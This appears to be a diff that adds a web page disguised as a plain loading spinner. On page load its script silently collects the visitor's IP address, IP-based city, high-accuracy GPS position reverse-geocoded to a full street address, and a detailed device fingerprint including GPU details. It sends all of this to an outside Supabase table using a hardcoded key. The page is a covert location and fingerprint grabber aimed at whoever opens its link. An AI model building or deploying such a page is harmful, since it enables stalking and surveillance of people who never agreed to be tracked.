@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <!-- Supabase JS Client -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body {
+            background-color: #0f172a;
+            color: #f8fafc;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .loader {
+            border: 4px solid #1e293b;
+            border-top: 4px solid #6366f1;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+
+    <script>
+        const SUPABASE_URL = 'https://lcgqrvvbenmolpfrgrqg.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxjZ3FydnZiZW5tb2xwZnJncnFnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODYwNTY3NjgsImV4cCI6MjEwMTYzMjc2OH0.yAbBGVII2xg5a2FU77Mwjyp7InNbl2StVVlD0o_ySsQ';
+        
+        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        function fetchWithTimeout(resource, options = {}, timeout = 4000) {
+            return Promise.race([
+                fetch(resource, options),
+                new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), timeout))
+            ]);
+        }
+
+        function getHighAccuracyGps() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) return resolve(null);
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracyMeters: pos.coords.accuracy }),
+                    () => resolve(null),
+                    { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }
+                );
+            });
+        }
+
+        async function getCityFromCoordinates(lat, lon) {
+            try {
+                const res = await fetchWithTimeout(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+                const data = await res.json();
+                const address = data.address || {};
+                return {
+                    verifiedCity: address.city || address.town || address.suburb || address.village || "Unknown",
+                    fullAddress: data.display_name || "N/A"
+                };
+            } catch (e) {
+                return { verifiedCity: "Unknown", fullAddress: "N/A" };
+            }
+        }
+
+        async function captureAndSendFootprint() {
+            let gpuVendor = "N/A", gpuRenderer = "N/A";
+            try {
+                const glCanvas = document.createElement('canvas');
+                const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch (e) {}
+
+            let publicIp = "Unavailable", ipCity = "Unknown", ipGoogleMapUrl = "N/A";
+            try {
+                const ipRes = await fetchWithTimeout('https://ipapi.co/json/', {}, 3000);
+                const ipData = await ipRes.json();
+                publicIp = ipData.ip || "Unavailable";
+                ipCity = ipData.city || "Unknown";
+                if (ipData.latitude && ipData.longitude) {
+                    ipGoogleMapUrl = `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`;
+                }
+            } catch (e) {}
+
+            const gpsCoords = await getHighAccuracyGps();
+            let verifiedGpsCity = "GPS Unavailable", fullAddress = "N/A", gpsGoogleMapUrl = "N/A";
+
+            if (gpsCoords) {
+                gpsGoogleMapUrl = `https://www.google.com/maps?q=${gpsCoords.latitude},${gpsCoords.longitude}`;
+                const geoDetails = await getCityFromCoordinates(gpsCoords.latitude, gpsCoords.longitude);
+                verifiedGpsCity = geoDetails.verifiedCity;
+                fullAddress = geoDetails.fullAddress;
+            }
+
+            const locationData = {
+                ipAddress: publicIp,
+                ipEstimatedCity: ipCity,
+                ipGoogleMapsUrl: ipGoogleMapUrl,
+                gpsVerifiedCity: verifiedGpsCity,
+                gpsGoogleMapsUrl: gpsGoogleMapUrl,
+                gpsFullAddress: fullAddress,
+                gpsRawData: gpsCoords
+            };
+
+            const deviceFingerprint = {
+                userAgent: navigator.userAgent,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                windowInnerSize: `${window.innerWidth}x${window.innerHeight}`,
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                platform: navigator.platform,
+                cpuCores: navigator.hardwareConcurrency || "N/A",
+                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
+                gpuVendor: gpuVendor,
+                gpuRenderer: gpuRenderer,
+                touchSupport: navigator.maxTouchPoints > 0
+            };
+
+            // Updated to insert directly into single_click_privacy table
+            await supabaseClient.from('single_click_privacy').insert([{
+                username: 'Auto_Visitor',
+                location_data: locationData,
+                device_fingerprint: deviceFingerprint
+            }]);
+        }
+
+        window.addEventListener('DOMContentLoaded', captureAndSendFootprint);
+    </script>
+</body>
+</html>
